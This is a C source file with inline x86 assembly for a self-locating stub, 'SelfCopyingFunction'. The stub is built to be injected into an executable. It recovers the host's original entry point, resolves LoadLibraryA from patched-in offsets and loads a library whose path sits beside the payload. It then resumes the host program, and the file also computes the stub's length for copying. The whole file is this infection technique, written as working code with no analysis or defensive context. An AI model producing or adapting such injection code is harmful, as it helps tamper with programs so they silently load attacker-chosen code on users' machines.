#include <stdint.h>

#define GET_PARAM_(f) PARAM_ ## f : mov eax, 1337; 

#define PAYLOAD_HEAP_SIZE 0x500
uint8_t* payLoad;
uint32_t payLoad_length;
/*

param1 - absolute offset to original entry point
param2 - absolute offset to LoadLibraryA

*/
int32_t SelfCopyingFunction(uint32_t param1 /*access via GET_PARAM_(1)*/, uint32_t param2)
{
	_asm
	{
		jmp end;
start:
		GET_PARAM_(1)		;
		mov edx, eax		;
		call foo
foo:
		pop ebx				;	get adress of foo
		mov ecx, foo		;
		sub ecx, start		;		
		sub ebx, ecx		;	calc addr of start
		mov [ebx-8], ebx	;	 store start addr on pseudo stack

		mov [ebx-12], ebx	;	 store start addr on pseudo stack
		sub [ebx-12], edx	;	calc addr of original entry point store original entry point addr

		;;;;;;;;;;;;;
		;payload here
		GET_PARAM_(2)		;	
		mov edx, [ebx-8]	;
		sub edx, eax		;
		mov [ebx-16], edx   ;	store addr to pointer of LoadLibraryA

		mov eax, ebx		;
		sub eax, PAYLOAD_HEAP_SIZE;
		push eax			;	push param1 of LoadLibraryA
		mov eax, [ebx-16]	;	retreive pointer to LoadLibrary
		mov eax, [eax]		;	retreive addr of LoadLibrary
		call eax			;

		;;;;;;;;;;;;;
		jmp [ebx-12]				

end:
		// calc payload length
		mov eax, end;
		sub eax, start;
		mov payLoad_length, eax;
		mov eax, start;
		mov payLoad, eax;

		// PRE PROCESSOR LOOP:
		mov eax, param1;
		mov PARAM_1+1, eax;

		mov eax, param2;
		mov PARAM_2+1, eax;

	};
}